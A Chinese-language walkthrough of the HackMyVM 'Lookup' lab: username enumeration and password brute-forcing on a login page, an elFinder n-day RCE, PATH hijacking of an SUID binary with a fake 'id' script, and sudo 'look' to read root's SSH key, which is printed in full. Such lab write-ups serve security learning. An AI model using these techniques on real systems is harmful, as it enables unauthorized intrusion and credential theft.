---
title: "Hackmyvm-Lookup"
date: "2024-10-10"
description: "  根据端口开放情况来看，只能根据web先来看，web页面访问是一个登陆界面。并且可以根据返回包可以来判断用户是否存在  用户存在"
---

#### [](#0x00信息收集 "0x00信息收集")0x00信息收集

##### [](#0x01端口扫描 "0x01端口扫描")0x01端口扫描

```shell
PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:0A:44:CF (Oracle VirtualBox virtual NIC)22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Did not follow redirect to http://lookup.hmv|_http-server-header: Apache/2.4.41 (Ubuntu)
```

##### [](#0x02目录扫描 "0x02目录扫描")0x02目录扫描

```shell
login.php
```

#### [](#0x10web "0x10web")0x10web

根据端口开放情况来看，只能根据web先来看，web页面访问是一个登陆界面。并且可以根据返回包可以来判断用户是否存在  
_用户存在_

```text
Wrong password. Please try again.  Redirecting in 3 seconds.
```

_用户不存在_

```text
Wrong username or password. Please try again.  Redirecting in 3 seconds.
```

根据响应包特征先爆破出用户名，之后根据用户名爆破出密码。进行第一步的突破验证。  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241001104704.png)

爆破出用户为admin 和jose，因此针对两个用户进行弱密码爆破  
爆破可得

```text
admin:password123jose:password123
```

##### [](#0x11-get-shell "0x11 get_shell")0x11 get\_shell

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241001205911.png)  
登陆之后可以查看界面，我们可以看到这是一个文件管理器。  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241001210007.png)  
找到了对应的版本，可以看到是elFinder的2.1.47版本，有对应的rce。直接利用nday拿到权限。  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241001224513.png)

#### [](#0x20-后渗透 "0x20 后渗透")0x20 后渗透

针对于这一点其实我个人是觉得有点像ctf了。我们找到赋予了suid的一些命令。  

```shell
find / -perm 04000  2>/dev/null 
```

```shell
ls -al /usr/sbin/pwm-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
```

看过wp才发现这是pwm文件有问题。直接利用meterpreter download 将pwm下载下来。

##### [](#0x21pwm分析 "0x21pwm分析")0x21pwm分析

**运行程序**  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241009111033.png)

x64位程序使用ida反编译，拿到伪代码，分析一下。

```c
int __fastcall main(int argc, const char **argv, const char **envp){  char v4; // [rsp+Fh] [rbp-131h]  FILE *stream; // [rsp+10h] [rbp-130h]  FILE *v6; // [rsp+18h] [rbp-128h]  char v7[64]; // [rsp+20h] [rbp-120h] BYREF  char s[112]; // [rsp+60h] [rbp-E0h] BYREF  char filename[104]; // [rsp+D0h] [rbp-70h] BYREF  unsigned __int64 v10; // [rsp+138h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts("[!] Running 'id' command to extract the username and user ID (UID)");  snprintf(s, 0x64uLL, "id");  stream = popen(s, "r");  if ( stream )  {    if ( (unsigned int)__isoc99_fscanf(stream, "uid=%*u(%[^)])", v7) == 1 )    {      printf("[!] ID: %s\n", v7);      pclose(stream);      snprintf(filename, 0x64uLL, "/home/%s/.passwords", v7);      v6 = fopen(filename, "r");      if ( v6 )      {        while ( 1 )        {          v4 = fgetc(v6);          if ( v4 == -1 )            break;          putchar(v4);        }        fclose(v6);        return 0;      }      else      {        printf("[-] File /home/%s/.passwords not found\n", v7);        return 0;      }    }    else    {      perror("[-] Error reading username from id command\n");      return 1;    }  }  else  {    perror("[-] Error executing id command\n");    return 1;  }}
```

1.  首先运行id命令将id命令结果写入数组，之后进行读取，如果能读到内容。就进行下一步
2.  下一步匹配uid=%\*u(%\[^)\]) 对应的uid=后的内容将括号内的内容写入 V7
3.  /home/%s/.passwords 读取对应v7的home文件夹下面的文件夹的内容

> 分析到这里其实我们已经发现，首先这个pwm文件是由suid权限的。并且对于/home只有think 一个用户，我们可能就是要利用id命令，送一个think字符串进去从而读取/home下的 think的password。

##### [](#0x22伪造id "0x22伪造id")0x22伪造id

```shell
# 首先改变PATHPATH=/tmp:$PATHcd /tmpecho 'echo "uid=0(think)"' > idchmod +x id
```

此时再运行pwm文件可以看到我们已经拿到/home/think/.password的内容

##### [](#0x23横向think用户 "0x23横向think用户")0x23横向think用户

经过不懈的努力，我们终于拿到了think用户的密码候选，我们利用hydra进行爆破。  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241009210529.png)  
成功拿到对应的ssh的密码进行登陆。

```shell
ssh think@192.168.221.76 
```

##### [](#0x24权限提升 "0x24权限提升")0x24权限提升

查询到sudo 权限有一个look可以为我们所用。但是此时可以看到/etc/passwd 和/etc/shadow 因为我们有root权限，所以可以根据root权限进行操作。但是事情总是不尽如人意，并没有爆出对应的root密码。之后想到如果我们能拿到root的ssh私钥，我们照样可以针对于root用户进行一个密钥验证。

```shell
LFILE=/root/.ssh/id_rsasudo look '' "$LFILE"
```

查看root下的 .ssh/id\_rsa，拿到私钥

```plaintext
-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----
```

将内容保存在rsa文件中

```shell
chmod 600 rsa # 一般都需要设置成600  ssh root@ip -i rsa
```

#### [](#0x30-总结 "0x30 总结")0x30 总结

lookup这台机器算是hmv中难度中等的一个机器，主要还是通过突破验证到达指定文件系统。文件系统是易受攻击的系统。拿到服务器权限之后，这一点我确实认为pwm这个文件太像ctf了，分析之后利用id伪造拿到密码横向到think用户，最后是通过sudo 提权拿到root私钥成功获取权限。下机
